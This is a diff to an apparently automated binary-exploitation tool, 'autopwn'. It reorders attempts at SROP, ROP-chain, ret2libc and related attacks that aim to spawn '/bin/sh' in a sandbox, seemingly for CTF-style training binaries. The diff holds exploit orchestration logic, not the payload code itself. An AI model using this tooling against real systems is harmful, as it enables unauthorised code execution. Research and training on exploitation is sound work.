@@ -132,10 +132,29 @@ def autopwn(binary: str, config=None, store=None,
     elif want("ret2win"):
         log("[combo] ret2win: no hay funcion gift -> se omite")
 
+    # combo A2: SROP FIRST on a no-PIE binary with no gift. autosrop is cheap (it bails fast when
+    # there is no `pop rax`+syscall+in-binary '/bin/sh') and, when it applies, verifies in one shot
+    # -- whereas the generic rop-chain below sweeps execve offsets slowly before falling back to
+    # SROP internally. Trying the dedicated fast path first keeps gadget-poor static binaries (srop,
+    # staticrop) within the trainer's per-binary budget.
+    if run and want("srop") and not is_pie and win is None and not res.win_exploit:
+        log("[combo] SROP: sigreturn -> execve('/bin/sh') (sandbox)...")
+        try:
+            from .autosrop import autosrop
+            rs = autosrop(binary)
+            verdict = True if rs.get("verified") else (None if rs.get("ok") else False)
+            res.attempts.append(("srop", verdict, rs.get("detail") or rs.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rs.get("verified"))
+            log(f"[combo] SROP -> {'SHELL VERIFICADA' if rs.get('verified') else 'no verificado'}")
+            learn(f"srop verified={rs.get('verified')} {rs.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("srop", False, str(e)))
+
     # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
     # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
-    # + SROP). Both verify by getting a real shell in the sandbox.
-    if want("rop-chain"):
+    # + SROP). Both verify by getting a real shell in the sandbox. Skipped once we already have a
+    # verified shell -- no point spending the slow execve-offset sweep after SROP/ret2win won.
+    if want("rop-chain") and not res.win_exploit:
       log("[combo] cadena ROP: intentando construir..." + (" (PIE)" if is_pie else ""))
       try:
         if is_pie:
@@ -154,8 +173,9 @@ def autopwn(binary: str, config=None, store=None,
       except Exception as e:
         res.attempts.append(("rop-chain", False, str(e)))
 
-    # combo B2: ret2libc with leak (dynamic binaries), verified by getting a shell
-    if want("ret2libc"):
+    # combo B2: ret2libc with leak (dynamic binaries), verified by getting a shell. Skipped once a
+    # shell is already verified.
+    if want("ret2libc") and not res.win_exploit:
         log("[combo] ret2libc con leak (fuga libc -> system, sandbox)...")
         try:
             from .autolibc import autolibc
@@ -268,22 +288,6 @@ def autopwn(binary: str, config=None, store=None,
             learn(f"canary-bypass verified={rc.get('verified')} {rc.get('detail','')}")
         except Exception as e:
             res.attempts.append(("canary-bypass", False, str(e)))
-
-    # combo H0: SROP (sigreturn -> execve) -- for a no-PIE binary too gadget-poor for a normal
-    # execve chain: a single rt_sigreturn restores all registers from a forged frame, needing only
-    # `pop rax; ret` + a syscall gadget + an in-binary "/bin/sh". Tried when nothing simpler worked.
-    if run and want("srop") and not is_pie and win is None and not res.win_exploit:
-        log("[combo] SROP: sigreturn -> execve('/bin/sh') (sandbox)...")
-        try:
-            from .autosrop import autosrop
-            rs = autosrop(binary)
-            verdict = True if rs.get("verified") else (None if rs.get("ok") else False)
-            res.attempts.append(("srop", verdict, rs.get("detail") or rs.get("note", "")))
-            res.win_exploit = res.win_exploit or bool(rs.get("verified"))
-            log(f"[combo] SROP -> {'SHELL VERIFICADA' if rs.get('verified') else 'no verificado'}")
-            learn(f"srop verified={rs.get('verified')} {rs.get('detail','')}")
-        except Exception as e:
-            res.attempts.append(("srop", False, str(e)))
 
     # combo H: ret2dlresolve -- last resort for a dynamic, no-PIE binary with NO gift and NO leak
     # (no win, no system in it): forge the linker's resolver structures to call system('/bin/sh')
